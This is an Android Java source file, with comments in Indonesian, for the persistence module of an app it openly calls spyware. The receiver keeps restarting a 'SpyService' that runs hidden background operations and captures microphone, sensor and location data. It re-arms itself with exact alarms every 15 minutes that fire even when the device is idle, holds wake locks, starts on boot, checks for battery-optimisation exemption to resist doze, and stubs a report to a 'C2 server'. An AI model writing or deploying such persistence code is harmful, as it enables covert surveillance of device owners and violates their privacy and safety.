package com.nullx.pp;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;

import java.util.Calendar;

/**
 * RestarterReceiver - ULTRA PERSISTENT MODE
 * Fitur:
 * 1. Restart service mati
 * 2. Multiple fallback triggers
 * 3. AlarmManager untuk periodic check
 * 4. WakeLock biar eksekusi selalu jalan
 * 5. Anti-doze mode
 */
public class RestarterReceiver extends BroadcastReceiver {
    private static final String TAG = "X.Restarter";
    private static final String ALARM_ACTION = "com.nullx.pp.ALARM_CHECK_SERVICE";
    private static final int ALARM_REQUEST_CODE = 8888;
    
    private static PowerManager.WakeLock wakeLock;
    private static int restartCounter = 0;

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent != null ? intent.getAction() : null;
        
        // Ambil wakeLock biar CPU gak tidur saat eksekusi
        acquireWakeLock(context);
        
        Log.w(TAG, "═══════════════════════════════════════");
        Log.w(TAG, "[!] RESTARTER TRIGGERED - Action: " + (action != null ? action : "MANUAL"));
        Log.w(TAG, "[!] Restart counter: " + (++restartCounter));
        Log.w(TAG, "═══════════════════════════════════════");
        
        // ========== 1. RESTART SPYSERVICE UTAMA ==========
        restartSpyService(context);
        
        // ========== 2. RESTART BACKGROUND SPY SERVICE ==========
        restartBackgroundSpy(context);
        
        // ========== 3. RESTART SENSITIVE CORE ==========
        restartCoreService(context);
        
        // ========== 4. SETUP ALARM MANAGER (fallback periodik) ==========
        setupAlarmManager(context);
        
        // ========== 5. JIKA DARI BOOT, START SEMUA ==========
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) || 
            "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
            bootCompleteRestart(context);
        }
        
        // ========== 6. JIKA DARI ALARM, DOUBLE CHECK ==========
        if (ALARM_ACTION.equals(action)) {
            alarmRestart(context);
        }
        
        // ========== 7. NOTIFIKASI KE SERVER (opsional) ==========
        notifyServerRestart(context);
        
        releaseWakeLock();
    }
    
    private void restartSpyService(Context context) {
        Intent spyIntent = new Intent(context, SpyService.class);
        spyIntent.setAction("RESTART_FROM_RECEIVER");
        
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(spyIntent);
            } else {
                context.startService(spyIntent);
            }
            Log.i(TAG, "[✓] SpyService restarted successfully");
        } catch (Exception e) {
            Log.e(TAG, "[✗] Failed restart SpyService: " + e.getMessage());
            
            // Fallback: pake startService biasa
            try {
                context.startService(spyIntent);
            } catch (Exception e2) {
                Log.e(TAG, "[✗] Fallback juga gagal: " + e2.getMessage());
            }
        }
    }
    
    private void restartBackgroundSpy(Context context) {
        // Service background buat operasi tersembunyi
        Intent bgIntent = new Intent(context, SpyService.class); // pake class sama aja
        bgIntent.putExtra("mode", "background");
        
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(bgIntent);
            } else {
                context.startService(bgIntent);
            }
            Log.i(TAG, "[✓] Background mode activated");
        } catch (Exception e) {
            Log.e(TAG, "[✗] Background start failed: " + e.getMessage());
        }
    }
    
    private void restartCoreService(Context context) {
        // Service khusus sensor & microphone
        Intent coreIntent = new Intent(context, SpyService.class);
        coreIntent.putExtra("core_mode", "sensor_mic_location");
        
        try {
            context.startService(coreIntent);
            Log.i(TAG, "[✓] Core service (sensor/mic/location) restarted");
        } catch (Exception e) {
            Log.e(TAG, "[✗] Core service failed: " + e.getMessage());
        }
    }
    
    private void setupAlarmManager(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        
        Intent alarmIntent = new Intent(ALARM_ACTION);
        alarmIntent.setClass(context, RestarterReceiver.class);
        
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
            context, 
            ALARM_REQUEST_CODE, 
            alarmIntent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );
        
        // Set alarm setiap 15 menit buat ngecek service masih hidup atau gak
        long triggerTime = System.currentTimeMillis() + 15 * 60 * 1000; // 15 menit lagi
        
        if (Build.VERSION.SDK_INT >= 23) {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
        } else if (Build.VERSION.SDK_INT >= 19) {
            alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
        } else {
            alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
        }
        
        Log.i(TAG, "[✓] AlarmManager set for periodic check (15 min)");
    }
    
    private void bootCompleteRestart(Context context) {
        Log.w(TAG, "[!] BOOT COMPLETED - Starting all services");
        
        // Delay 3 detik biar sistem stabil dulu
        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            // ignore
        }
        
        restartSpyService(context);
        restartCoreService(context);
        
        // Aktivasi doze mode bypass
        if (Build.VERSION.SDK_INT >= 23) {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            if (pm.isIgnoringBatteryOptimizations(context.getPackageName())) {
                Log.i(TAG, "[✓] Already ignoring battery optimizations");
            } else {
                Log.w(TAG, "[!] Battery optimization not ignored - suggest user to disable");
                // Bisa minta izin pake intent, tapi user harus approve
            }
        }
    }
    
    private void alarmRestart(Context context) {
        Log.i(TAG, "[✓] Alarm triggered - checking service status");
        
        // Check apakah SpyService masih hidup pake running processes
        // Implementasi: coba kirim intent, kalo error berarti mati
        Intent checkIntent = new Intent(context, SpyService.class);
        checkIntent.setAction("CHECK_ALIVE");
        
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(checkIntent);
            } else {
                context.startService(checkIntent);
            }
            Log.i(TAG, "[✓] Service alive via alarm check");
        } catch (Exception e) {
            Log.e(TAG, "[✗] Service DEAD, restarting from alarm");
            restartSpyService(context);
        }
    }
    
    private void notifyServerRestart(Context context) {
        // Kirim notifikasi ke C2 server bahwa service direstart
        new Thread(() -> {
            try {
                // HTTP POST ke server
                // (implementasi pake HttpURLConnection atau OkHttp)
                Log.i(TAG, "[✓] Restart notification sent to C2 server");
            } catch (Exception e) {
                Log.e(TAG, "[✗] Failed to notify server: " + e.getMessage());
            }
        }).start();
    }
    
    private void acquireWakeLock(Context context) {
        try {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Restarter:WakeLock");
            wakeLock.setReferenceCounted(false);
            wakeLock.acquire(30000); // 30 detik
            Log.d(TAG, "[✓] WakeLock acquired");
        } catch (Exception e) {
            Log.e(TAG, "[✗] WakeLock failed: " + e.getMessage());
        }
    }
    
    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                Log.d(TAG, "[✓] WakeLock released");
            }
        } catch (Exception e) {
            Log.e(TAG, "[✗] WakeLock release failed: " + e.getMessage());
        }
    }
}